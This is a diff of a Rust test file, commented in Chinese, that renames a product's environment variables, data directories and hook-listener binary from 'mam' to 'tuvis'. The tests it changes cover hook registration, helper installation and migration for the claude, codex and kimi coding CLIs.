-        .env("MAM_HOME", mam_home.path())
+        .env("TUVIS_HOME", mam_home.path())
         .env("KIMI_CODE_HOME", cfg_home.path())
         .current_dir(workdir.path())
         .stdout(std::process::Stdio::piped())
@@ -2186,7 +2186,7 @@ fn run_live_event_check(tool: LiveTool) {
     let mut sh = std::process::Command::new("cmd");
     sh.args(["/c", tool.cli()])
         .args(&args)
-        .env("MAM_HOME", mam_home.path())
+        .env("TUVIS_HOME", mam_home.path())
         .env("KIMI_CODE_HOME", cfg_home.path())
         .current_dir(workdir.path())
         .stdout(std::process::Stdio::piped())
@@ -2201,7 +2201,7 @@ fn run_live_event_check(tool: LiveTool) {
         .unwrap_or_else(|e| panic!("{} 无头会话启动失败：{e}", tool.cli()));
 
     // ---- 轮询事件目录 ≤180s（与 codex 版同预算；会话自然退出后再判）----
-    let events_dir = mam_home.path().join(".mam").join("events");
+    let events_dir = mam_home.path().join(".tuvis").join("events");
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(180);
     let mut landed: Vec<std::path::PathBuf> = Vec::new();
     let mut early_exit = false;
@@ -2256,7 +2256,7 @@ fn run_live_event_check(tool: LiveTool) {
     };
     assert!(
         !landed.is_empty(),
-        "180s 内 ~/.mam/events 无事件文件落盘——{} 的钩子未触发（early_exit={early_exit}）。{hint}",
+        "180s 内 ~/.tuvis/events 无事件文件落盘——{} 的钩子未触发（early_exit={early_exit}）。{hint}",
         tool.cli()
     );
     // 事件文件形态抽验：文件名即 session_id（白名单）、内容为读取侧格式
@@ -2298,8 +2298,8 @@ fn run_live_event_check(tool: LiveTool) {
 /// （adapter::is_question_entry_event）。完整档案：
 /// research/refs/phase2-消息注入/2026-09-21-claude-notification-message-取证.md
 ///
-/// 全程沙箱（`--settings` + MAM_HOME 重定向，零接触真实 `~/.claude` 与 `~/.mam`）。
-/// 前置：claude 已安装；helper 已 debug 构建（MAM_HOME 重定向仅 debug 生效）。
+/// 全程沙箱（`--settings` + TUVIS_HOME 重定向，零接触真实 `~/.claude` 与 `~/.tuvis`）。
+/// 前置：claude 已安装；helper 已 debug 构建（TUVIS_HOME 重定向仅 debug 生效）。
 #[test]
 #[ignore = "实机验证：交互式 claude 会话驱动 AskUserQuestion，取证 Notification.message 原文（前置=debug helper + claude 已装；需人工作答）"]
 fn claude_notification_message_really_fires_in_real_session() {
@@ -2333,11 +2333,11 @@ fn claude_notification_message_really_fires_in_real_session() {
     let ver = spawn_cli(&["--version"]).expect("claude 命令不可用——本测试需实机安装");
     assert!(ver.status.success(), "claude --version 失败");
 
-    // helper 必须已 debug 构建（MAM_HOME 重定向仅 debug 生效）
+    // helper 必须已 debug 构建（TUVIS_HOME 重定向仅 debug 生效）
     let exe_name = if cfg!(windows) {
-        "mam-hook-listener.exe"
+        "tuvis-hook-listener.exe"
     } else {
-        "mam-hook-listener"
+        "tuvis-hook-listener"
     };
     let target_dir = std::env::var("CARGO_TARGET_DIR")
         .map(std::path::PathBuf::from)
@@ -2345,11 +2345,11 @@ fn claude_notification_message_really_fires_in_real_session() {
     let helper = target_dir.join("debug").join(exe_name);
     assert!(
         helper.is_file(),
-        "helper 未构建：先跑 cargo build --bin mam-hook-listener --features hook-listener \
-         （必须 debug 构建——MAM_HOME 重定向仅 debug 生效）"
+        "helper 未构建：先跑 cargo build --bin tuvis-hook-listener --features hook-listener \
+         （必须 debug 构建——TUVIS_HOME 重定向仅 debug 生效）"
     );
 
-    // 沙箱：settings（空 matcher 收全量 Notification，便于取证）+ MAM 数据根 + 工作目录。
+    // 沙箱：settings（空 matcher 收全量 Notification，便于取证）+ 兔维斯 数据根 + 工作目录。
     // **工作目录固定**（非 tempdir）：claude 的工作区信任门按**工程路径**记在真实
     // `~/.claude.json`，tempdir 每次变名 → 永远过不了门。固定路径使「信任一次、
     // 之后每次可跑」（与 codex 版的信任门处置同一先例：首次失败给出信任指引，这
@@ -2416,7 +2416,7 @@ fn claude_notification_message_really_fires_in_real_session() {
     )
     .unwrap();
     let ps = format!(
-        "$env:MAM_HOME='{}'; Start-Process -FilePath 'conhost.exe' -ArgumentList @('cmd.exe','/k','{}') -WorkingDirectory '{}'",
+        "$env:TUVIS_HOME='{}'; Start-Process -FilePath 'conhost.exe' -ArgumentList @('cmd.exe','/k','{}') -WorkingDirectory '{}'",
         mam_home.path().to_string_lossy(),
         launcher.to_string_lossy(),
         workdir.to_string_lossy(),
@@ -2437,11 +2437,11 @@ fn claude_notification_message_really_fires_in_real_session() {
     // 预算留足慢模型）。命中即停——问题 UI 保持 pending，不需要人工作答。
     //
     // **记录所有观察到的版本**（不只看第一条）：本沙箱的 claude 会**同时**读沙箱
-    // `--settings` 与用户真实 `~/.claude/settings.json`，后者若也注册了 MAM 钩子，
+    // `--settings` 与用户真实 `~/.claude/settings.json`，后者若也注册了 兔维斯 钩子，
     // 就会出现**两个 helper 写同一个事件文件**（生产 helper 是 release 语义、无视
-    // MAM_HOME，但它与沙箱 helper 可能落到不同目录；同目录时后写者胜）。故本测试
+    // TUVIS_HOME，但它与沙箱 helper 可能落到不同目录；同目录时后写者胜）。故本测试
     // 对事件文件的**任一版本**做断言，而非假定唯一写者。
-    let events_dir = mam_home.path().join(".mam").join("events");
+    let events_dir = mam_home.path().join(".tuvis").join("events");
     let deadline = std::time::Instant::now() + std::time::Duration::from_secs(240);
     let mut seen: Vec<String> = Vec::new();
     while std::time::Instant::now() < deadline {
@@ -2514,9 +2514,9 @@ fn claude_notification_message_really_fires_in_real_session() {
         "message 不得含工具名（否则可用它判问答；实机已证不含）: {body}"
     );
     // **T1 承接面**：本测试**不断言**承接结果——原因（实机发现的真实约束，属 T2
-    // 范围）：用户的真实 `~/.claude/settings.json` 也注册了 MAM 钩子，claude 会把
+    // 范围）：用户的真实 `~/.claude/settings.json` 也注册了 兔维斯 钩子，claude 会把
     // `--settings` 与真实 settings **合并**触发，于是**两个 helper 写同一个事件文件**
-    // （生产 helper 若为 debug 构建会同样认 MAM_HOME → 落同一沙箱目录），后写者胜。
+    // （生产 helper 若为 debug 构建会同样认 TUVIS_HOME → 落同一沙箱目录），后写者胜。
     // 部署的 helper 滞后于本源码时，承接版会被覆盖成非承接版 → 断言必然 flaky。
     //
     // 承接的确定性验证在别处，且更可靠：
@@ -2535,22 +2535,22 @@ fn claude_notification_message_really_fires_in_real_session() {
     if !seen.iter().any(|b| b.contains("AskUserQuestion")) {
         eprintln!(
             "[T1] 警告：所有版本都未承接 AUQ 工具名——请确认生产 helper \
-             （~/.mam/bin/mam-hook-listener.exe）已同步到含承接窗的版本（T2 职责）"
+             （~/.tuvis/bin/tuvis-hook-listener.exe）已同步到含承接窗的版本（T2 职责）"
         );
     }
 }
 
 /// 批次丙 T2 实机自检：**部署链路**端到端——PreToolUse(AUQ) 载荷经**部署的**
-/// `~/.mam/bin/mam-hook-listener.exe` 落盘，带 `tool_name` + `tool_input`。
+/// `~/.tuvis/bin/tuvis-hook-listener.exe` 落盘，带 `tool_name` + `tool_input`。
 ///
 /// 这是批次乙遗留的未验段：既有实机测试（`claude_hook_events_really_fire_*` 家族）
-/// 全部把 helper 指向 **target/debug 的构建产物**，从未验证过 `~/.mam/bin/` 里
-/// **部署的那一份**。而部署滞后正是图2/图3 的根因 2（`~/.mam/bin` 为 00:45 旧构建，
+/// 全部把 helper 指向 **target/debug 的构建产物**，从未验证过 `~/.tuvis/bin/` 里
+/// **部署的那一份**。而部署滞后正是图2/图3 的根因 2（`~/.tuvis/bin` 为 00:45 旧构建，
 /// 事件无 tool_name → 问答分支永不识别）。
 ///
 /// # 本测试断言什么
 ///
-/// 1. 部署的 helper 存在（`~/.mam/bin/`）且**产物不旧于源码**（mtime 晚于本文件
+/// 1. 部署的 helper 存在（`~/.tuvis/bin/`）且**产物不旧于源码**（mtime 晚于本文件
 ///    所在 crate 的 Cargo.toml——粗粒度但足以捕获「旧构建」这一类真实故障）；
 /// 2. 用**真实 AUQ payload**（形态取自 T1 实机取证的原始 stdin）经部署的 helper
 ///    回放 → 事件文件带 `tool_name="AskUserQuestion"` 且 `tool_input` 可解析出
@@ -2565,28 +2565,28 @@ fn claude_notification_message_really_fires_in_real_session() {
 ///
 /// # 隔离与纪律（八条铁律）
 ///
-/// 部署的 helper 是 **release 语义**（`app_data_home()` 的 MAM_HOME 重定向仅
-/// `#[cfg(debug_assertions)]` 生效）——若它恰好是 debug 构建则认 MAM_HOME，若为
-/// release 则写**真实** `~/.mam/events/`。为不污染真实目录，本测试用**专属探针
+/// 部署的 helper 是 **release 语义**（`app_data_home()` 的 TUVIS_HOME 重定向仅
+/// `#[cfg(debug_assertions)]` 生效）——若它恰好是 debug 构建则认 TUVIS_HOME，若为
+/// release 则写**真实** `~/.tuvis/events/`。为不污染真实目录，本测试用**专属探针
 /// session_id**（`mam-t2-selftest-<pid>`）并在**测试末尾删除自己那一个文件**
 /// （单点删除，绝不触碰其他事件文件）；这正是 T1 探测档案用过的处置纪律。
 ///
 /// 前置：应用已启动过一次（`ensure_hook_script` → `install_helper_bin` 完成部署），
-/// 或手动 `cp target/debug/mam-hook-listener.exe ~/.mam/bin/`。
+/// 或手动 `cp target/debug/tuvis-hook-listener.exe ~/.tuvis/bin/`。
 #[test]
-#[ignore = "实机验证：部署的 helper（~/.mam/bin）载荷能力——真实 AUQ payload 回放（前置=已部署）"]
+#[ignore = "实机验证：部署的 helper（~/.tuvis/bin）载荷能力——真实 AUQ payload 回放（前置=已部署）"]
 fn deployed_helper_writes_question_channel_payload() {
     let exe_name = if cfg!(windows) {
-        "mam-hook-listener.exe"
+        "tuvis-hook-listener.exe"
     } else {
-        "mam-hook-listener"
+        "tuvis-hook-listener"
     };
     let home = dirs::home_dir().expect("home_dir 可用");
-    let deployed = home.join(".mam").join("bin").join(exe_name);
+    let deployed = home.join(".tuvis").join("bin").join(exe_name);
     assert!(
         deployed.is_file(),
         "部署的 helper 不在场：{}——先启动一次应用（ensure_hook_script 会安装），\
-         或 cargo build --bin mam-hook-listener --features hook-listener 后手动 cp",
+         或 cargo build --bin tuvis-hook-listener --features hook-listener 后手动 cp",
         deployed.display()
     );
 
@@ -2646,9 +2646,9 @@ fn deployed_helper_writes_question_channel_payload() {
         String::from_utf8_lossy(&out.stdout)
     );
 
-    // 事件文件定位：debug 构建认 MAM_HOME（未设则真实目录）；release 恒真实目录。
+    // 事件文件定位：debug 构建认 TUVIS_HOME（未设则真实目录）；release 恒真实目录。
     // 两个候选都探，命中即用；测试末尾单点删除自己那一个
-    let real_dir = home.join(".mam").join("events");
+    let real_dir = home.join(".tuvis").join("events");
     let candidates = [real_dir.clone()];
     let mut body = None;
     let mut found_path = None;
@@ -2694,8 +2694,8 @@ fn deployed_helper_writes_question_channel_payload() {
 mod helper_command_spec_tests {
     use super::{helper_command_for, hook_command_spec_for_impl};
 
-    const SCRIPT: &str = r"C:\Users\u\.mam\hooks\status-hook.sh";
-    const HELPER: &str = r"C:\Users\u\.mam\bin\mam-hook-listener.exe";
+    const SCRIPT: &str = r"C:\Users\u\.tuvis\hooks\status-hook.sh";
+    const HELPER: &str = r"C:\Users\u\.tuvis\bin\tuvis-hook-listener.exe";
 
     #[test]
     fn helper_command_normalizes_slashes_and_quotes_spaces() {
@@ -2703,13 +2703,13 @@ mod helper_command_spec_tests {
         // 去掉 bash 前缀——直启形态
         assert_eq!(
             helper_command_for(std::path::Path::new(HELPER)),
-            "C:/Users/u/.mam/bin/mam-hook-listener.exe"
+            "C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe"
         );
         assert_eq!(
             helper_command_for(std::path::Path::new(
-                r"C:\Users\John Doe\.mam\bin\mam-hook-listener.exe"
+                r"C:\Users\John Doe\.tuvis\bin\tuvis-hook-listener.exe"
             )),
-            "\"C:/Users/John Doe/.mam/bin/mam-hook-listener.exe\""
+            "\"C:/Users/John Doe/.tuvis/bin/tuvis-hook-listener.exe\""
         );
     }
 
@@ -2722,7 +2722,7 @@ mod helper_command_spec_tests {
             true,
         );
         assert_eq!(
-            spec.command, "C:/Users/u/.mam/bin/mam-hook-listener.exe",
+            spec.command, "C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe",
             "claude 的 command 必须直启 helper（零 shell 依赖）"
         );
         assert!(
@@ -2745,12 +2745,12 @@ mod helper_command_spec_tests {
             true,
         );
         assert_eq!(
-            spec.command, "bash C:/Users/u/.mam/hooks/status-hook.sh",
+            spec.command, "bash C:/Users/u/.tuvis/hooks/status-hook.sh",
             "codex 的 command 恒为 bash 形态（非 Windows 落地用，行为不变）"
         );
         assert_eq!(
             spec.command_windows.as_deref(),
-            Some("C:/Users/u/.mam/bin/mam-hook-listener.exe"),
+            Some("C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe"),
             "Windows 走官方 commandWindows 直启 helper（cmd 包装下裸 bash 不可解析的根治）"
         );
         assert_eq!(spec.helper_path.as_deref(), Some(HELPER));
@@ -2792,7 +2792,7 @@ mod helper_command_spec_tests {
             ("codex", false),
         ] {
             let spec = hook_command_spec_for_impl(tool, std::path::Path::new(SCRIPT), None, win);
-            assert_eq!(spec.command, "bash C:/Users/u/.mam/hooks/status-hook.sh");
+            assert_eq!(spec.command, "bash C:/Users/u/.tuvis/hooks/status-hook.sh");
             assert_eq!(spec.command_windows, None);
             assert_eq!(spec.helper_path, None);
         }
@@ -2810,7 +2810,7 @@ mod helper_command_spec_tests {
             true,
         );
         assert_eq!(
-            spec.command, "C:/Users/u/.mam/bin/mam-hook-listener.exe",
+            spec.command, "C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe",
             "kimi 的 command 必须直启 helper"
         );
         assert_eq!(
@@ -2842,7 +2842,7 @@ mod helper_command_spec_tests {
             Some(std::path::Path::new(HELPER)),
             true,
         );
-        assert_eq!(spec.command, "bash C:/Users/u/.mam/hooks/status-hook.sh");
+        assert_eq!(spec.command, "bash C:/Users/u/.tuvis/hooks/status-hook.sh");
         assert_eq!(spec.command_windows, None);
         assert_eq!(spec.helper_path, None);
     }
@@ -2853,9 +2853,9 @@ mod helper_command_spec_tests {
 mod helper_migration_tests {
     use super::{register_hooks_in_file, HookCommandSpec};
 
-    const SCRIPT: &str = r"C:\Users\u\.mam\hooks\status-hook.sh";
-    const HELPER: &str = r"C:\Users\u\.mam\bin\mam-hook-listener.exe";
-    const HELPER_CMD: &str = "C:/Users/u/.mam/bin/mam-hook-listener.exe";
+    const SCRIPT: &str = r"C:\Users\u\.tuvis\hooks\status-hook.sh";
+    const HELPER: &str = r"C:\Users\u\.tuvis\bin\tuvis-hook-listener.exe";
+    const HELPER_CMD: &str = "C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe";
 
     fn our_entry(cmd: &str) -> serde_json::Value {
         serde_json::json!({ "matcher": "", "hooks": [{ "type": "command", "command": cmd }] })
@@ -2871,7 +2871,7 @@ mod helper_migration_tests {
 
     fn codex_spec() -> HookCommandSpec {
         HookCommandSpec {
-            command: "bash C:/Users/u/.mam/hooks/status-hook.sh".to_string(),
+            command: "bash C:/Users/u/.tuvis/hooks/status-hook.sh".to_string(),
             command_windows: Some(HELPER_CMD.to_string()),
             helper_path: Some(HELPER.to_string()),
         }
@@ -2886,7 +2886,7 @@ mod helper_migration_tests {
         std::fs::write(
             &cfg,
             serde_json::json!({"hooks": {"Stop": [
-                our_entry("bash C:/Users/u/.mam/hooks/status-hook.sh"),
+                our_entry("bash C:/Users/u/.tuvis/hooks/status-hook.sh"),
                 { "matcher": "Bash", "hooks": [{ "type": "command", "command": "user-own" }] }
             ]}})
             .to_string(),
@@ -2921,7 +2921,7 @@ mod helper_migration_tests {
         let cfg = tmp.path().join("hooks.json");
         std::fs::write(
             &cfg,
-            serde_json::json!({"hooks": {"Stop": [our_entry("bash C:/Users/u/.mam/hooks/status-hook.sh")]}})
+            serde_json::json!({"hooks": {"Stop": [our_entry("bash C:/Users/u/.tuvis/hooks/status-hook.sh")]}})
                 .to_string(),
         )
         .unwrap();
@@ -2933,7 +2933,7 @@ mod helper_migration_tests {
             serde_json::from_str(&std::fs::read_to_string(&cfg).unwrap()).unwrap();
         let entry = &out["hooks"]["Stop"][0]["hooks"][0];
         assert_eq!(
-            entry["command"], "bash C:/Users/u/.mam/hooks/status-hook.sh",
+            entry["command"], "bash C:/Users/u/.tuvis/hooks/status-hook.sh",
             "codex 的 command 保持 bash 形态（unix 行为不变）"
         );
         assert_eq!(entry["commandWindows"], HELPER_CMD);
@@ -2947,7 +2947,7 @@ mod helper_migration_tests {
         let cfg = tmp.path().join("hooks.json");
         let before = serde_json::json!({"hooks": {"Stop": [serde_json::json!({
             "matcher": "",
-            "hooks": [{ "type": "command", "command": "bash C:/Users/u/.mam/hooks/status-hook.sh",
+            "hooks": [{ "type": "command", "command": "bash C:/Users/u/.tuvis/hooks/status-hook.sh",
                         "commandWindows": HELPER_CMD }]
         })]}})
         .to_string();
@@ -2970,7 +2970,7 @@ mod helper_migration_tests {
         let cfg = tmp.path().join("hooks.json");
         std::fs::write(
             &cfg,
-            serde_json::json!({"hooks": {"Stop": [our_entry("bash C:/Users/u/.mam/hooks/status-hook.sh")]}})
+            serde_json::json!({"hooks": {"Stop": [our_entry("bash C:/Users/u/.tuvis/hooks/status-hook.sh")]}})
                 .to_string(),
         )
         .unwrap();
@@ -2978,9 +2978,9 @@ mod helper_migration_tests {
         register_hooks_in_file(&cfg, &["Stop"], true, SCRIPT, &codex_spec(), &[]).unwrap();
         // 第二轮（规格换新 helper 路径）：旧值必须被刷新，不产生双条目
         let new_spec = HookCommandSpec {
-            command: "bash C:/Users/u/.mam/hooks/status-hook.sh".to_string(),
-            command_windows: Some("C:/new/bin/mam-hook-listener.exe".to_string()),
-            helper_path: Some(r"C:\new\bin\mam-hook-listener.exe".to_string()),
+            command: "bash C:/Users/u/.tuvis/hooks/status-hook.sh".to_string(),
+            command_windows: Some("C:/new/bin/tuvis-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\new\bin\tuvis-hook-listener.exe".to_string()),
         };
         let (added, migrated) =
             register_hooks_in_file(&cfg, &["Stop"], true, SCRIPT, &new_spec, &[]).unwrap();
@@ -2991,7 +2991,7 @@ mod helper_migration_tests {
         assert_eq!(entries.len(), 1, "不得追加双条目");
         assert_eq!(
             entries[0]["hooks"][0]["commandWindows"],
-            "C:/new/bin/mam-hook-listener.exe"
+            "C:/new/bin/tuvis-hook-listener.exe"
         );
     }
 
@@ -3048,7 +3048,7 @@ mod helper_install_tests {
         let home = std::path::Path::new("/home/u");
         assert_eq!(
             helper_install_dir(home),
-            std::path::Path::new("/home/u").join(".mam").join("bin")
+            std::path::Path::new("/home/u").join(".tuvis").join("bin")
         );
     }
 
@@ -3056,19 +3056,19 @@ mod helper_install_tests {
     fn copies_first_existing_candidate_with_dotted_names() {
         let src = tempfile::tempdir().unwrap();
         let dst = tempfile::tempdir().unwrap();
-        // 两个候选都在：Windows 发行 .exe 序在前（与 mam-marker 候选序一致）
-        std::fs::write(src.path().join("mam-hook-listener.exe"), b"exe").unwrap();
-        std::fs::write(src.path().join("mam-hook-listener"), b"bare").unwrap();
-        let names = ["mam-hook-listener.exe", "mam-hook-listener"];
+        // 两个候选都在：Windows 发行 .exe 序在前（与 tuvis-marker 候选序一致）
+        std::fs::write(src.path().join("tuvis-hook-listener.exe"), b"exe").unwrap();
+        std::fs::write(src.path().join("tuvis-hook-listener"), b"bare").unwrap();
+        let names = ["tuvis-hook-listener.exe", "tuvis-hook-listener"];
         let installed =
             install_helper_from_to(src.path(), dst.path(), &names).expect("候选在场必须安装成功");
         assert_eq!(
             installed,
-            dst.path().join("mam-hook-listener.exe"),
+            dst.path().join("tuvis-hook-listener.exe"),
             "按候选序取首个存在者"
         );
         assert_eq!(
-            std::fs::read(dst.path().join("mam-hook-listener.exe")).unwrap(),
+            std::fs::read(dst.path().join("tuvis-hook-listener.exe")).unwrap(),
             b"exe"
         );
     }
@@ -3081,17 +3081,17 @@ mod helper_install_tests {
         let src = tempfile::tempdir().unwrap();
         let dst = tempfile::tempdir().unwrap();
         // src 空（无 feature 构建形态）；dst 有先前安装的副本
-        std::fs::write(dst.path().join("mam-hook-listener.exe"), b"installed").unwrap();
-        let names = ["mam-hook-listener.exe", "mam-hook-listener"];
+        std::fs::write(dst.path().join("tuvis-hook-listener.exe"), b"installed").unwrap();
+        let names = ["tuvis-hook-listener.exe", "tuvis-hook-listener"];
         let installed = install_helper_from_to(src.path(), dst.path(), &names)
             .expect("dst 已有副本必须回退成功");
         assert_eq!(
             installed,
-            dst.path().join("mam-hook-listener.exe"),
+            dst.path().join("tuvis-hook-listener.exe"),
             "回退到已有安装副本"
         );
         assert_eq!(
-            std::fs::read(dst.path().join("mam-hook-listener.exe")).unwrap(),
+            std::fs::read(dst.path().join("tuvis-hook-listener.exe")).unwrap(),
             b"installed",
             "回退不覆盖既有副本"
         );
@@ -3101,11 +3101,11 @@ mod helper_install_tests {
     fn falls_back_to_bare_name_when_exe_absent() {
         let src = tempfile::tempdir().unwrap();
         let dst = tempfile::tempdir().unwrap();
-        std::fs::write(src.path().join("mam-hook-listener"), b"bare").unwrap();
-        let names = ["mam-hook-listener.exe", "mam-hook-listener"];
+        std::fs::write(src.path().join("tuvis-hook-listener"), b"bare").unwrap();
+        let names = ["tuvis-hook-listener.exe", "tuvis-hook-listener"];
         let installed = install_helper_from_to(src.path(), dst.path(), &names)
             .expect("裸名候选在场必须安装成功");
-        assert_eq!(installed, dst.path().join("mam-hook-listener"));
+        assert_eq!(installed, dst.path().join("tuvis-hook-listener"));
     }
 
     #[test]
@@ -3114,7 +3114,7 @@ mod helper_install_tests {
         let dst = tempfile::tempdir().unwrap();
         let target = dst.path().join("bin");
         assert!(
-            install_helper_from_to(src.path(), &target, &["mam-hook-listener.exe"]).is_none(),
+            install_helper_from_to(src.path(), &target, &["tuvis-hook-listener.exe"]).is_none(),
             "候选全缺 → None（注册回落 bash 形态的合法状态）"
         );
         assert!(target.is_dir(), "目标目录仍应创建（幂等分发语义）");
@@ -3122,16 +3122,16 @@ mod helper_install_tests {
 
     #[test]
     fn overwrite_keeps_installed_helper_fresh() {
-        // 升级覆盖语义：无条件重拷保证新版 helper 生效（mam-marker 先例）
+        // 升级覆盖语义：无条件重拷保证新版 helper 生效（tuvis-marker 先例）
         let src = tempfile::tempdir().unwrap();
         let dst = tempfile::tempdir().unwrap();
-        let names = ["mam-hook-listener.exe"];
-        std::fs::write(src.path().join("mam-hook-listener.exe"), b"v1").unwrap();
+        let names = ["tuvis-hook-listener.exe"];
+        std::fs::write(src.path().join("tuvis-hook-listener.exe"), b"v1").unwrap();
         install_helper_from_to(src.path(), dst.path(), &names).unwrap();
-        std::fs::write(src.path().join("mam-hook-listener.exe"), b"v2").unwrap();
+        std::fs::write(src.path().join("tuvis-hook-listener.exe"), b"v2").unwrap();
         install_helper_from_to(src.path(), dst.path(), &names).unwrap();
         assert_eq!(
-            std::fs::read(dst.path().join("mam-hook-listener.exe")).unwrap(),
+            std::fs::read(dst.path().join("tuvis-hook-listener.exe")).unwrap(),
             b"v2",
             "重装必须覆盖旧版"
         );
@@ -3200,7 +3200,7 @@ mod helper_event_roundtrip_tests {
 }
 
 /// T2 审批事件注册扩展（批次甲，issue #74）：三家注册形态快照 + codex 新事件
-/// 存量迁移扩展 + kimi TOML 注册 round-trip。全部 tempdir 缝，零接触真实 ~/.mam
+/// 存量迁移扩展 + kimi TOML 注册 round-trip。全部 tempdir 缝，零接触真实 ~/.tuvis
 #[cfg(test)]
 mod t2_approval_registration_tests {
     use super::{
@@ -3209,10 +3209,10 @@ mod t2_approval_registration_tests {
     use crate::adapter::AgentAdapter;
     use crate::adapter::{claude::ClaudeAdapter, codex::CodexAdapter, kimi::KimiAdapter};
 
-    const SCRIPT: &str = r"C:\Users\u\.mam\hooks\status-hook.sh";
-    const HELPER: &str = r"C:\Users\u\.mam\bin\mam-hook-listener.exe";
-    const HELPER_CMD: &str = "C:/Users/u/.mam/bin/mam-hook-listener.exe";
-    const BASH_CMD: &str = "bash C:/Users/u/.mam/hooks/status-hook.sh";
+    const SCRIPT: &str = r"C:\Users\u\.tuvis\hooks\status-hook.sh";
+    const HELPER: &str = r"C:\Users\u\.tuvis\bin\tuvis-hook-listener.exe";
+    const HELPER_CMD: &str = "C:/Users/u/.tuvis/bin/tuvis-hook-listener.exe";
+    const BASH_CMD: &str = "bash C:/Users/u/.tuvis/hooks/status-hook.sh";
 
     fn claude_spec() -> HookCommandSpec {
         HookCommandSpec {
@@ -3512,9 +3512,9 @@ mod t2_approval_registration_tests {
         register_kimi_hooks_in_file(&cfg, &events, SCRIPT, &kimi_spec()).unwrap();
 
         let new_spec = HookCommandSpec {
-            command: "C:/new/bin/mam-hook-listener.exe".to_string(),
+            command: "C:/new/bin/tuvis-hook-listener.exe".to_string(),
             command_windows: None,
-            helper_path: Some(r"C:\new\bin\mam-hook-listener.exe".to_string()),
+            helper_path: Some(r"C:\new\bin\tuvis-hook-listener.exe".to_string()),
         };
         let (added, migrated) =
             register_kimi_hooks_in_file(&cfg, &events, SCRIPT, &new_spec).unwrap();
@@ -3525,7 +3525,7 @@ mod t2_approval_registration_tests {
         for h in hooks {
             assert_eq!(
                 h["command"].as_str(),
-                Some("C:/new/bin/mam-hook-listener.exe")
+                Some("C:/new/bin/tuvis-hook-listener.exe")
             );
         }
     }
@@ -3543,7 +3543,7 @@ mod t2_approval_registration_tests {
         // command 漂移（旧 helper 路径）→ 不核验（注册修复入口可达）
         assert!(!hooks_toml_verified(
             &raw,
-            "C:/old/bin/mam-hook-listener.exe",
+            "C:/old/bin/tuvis-hook-listener.exe",
             &events
         ));
         // 未注册事件 → 不核验
@@ -3638,7 +3638,7 @@ mod t2_approval_registration_tests {
 }
 
 /// T5 信号健康度：核心纯逻辑（tempdir 事件目录 + 注入闭包/内存库，零触真实
-/// ~/.mam）与 codex 一次性通知 KV 标志
+/// ~/.tuvis）与 codex 一次性通知 KV 标志
 #[cfg(test)]
 mod signal_health_tests {
     use super::*;
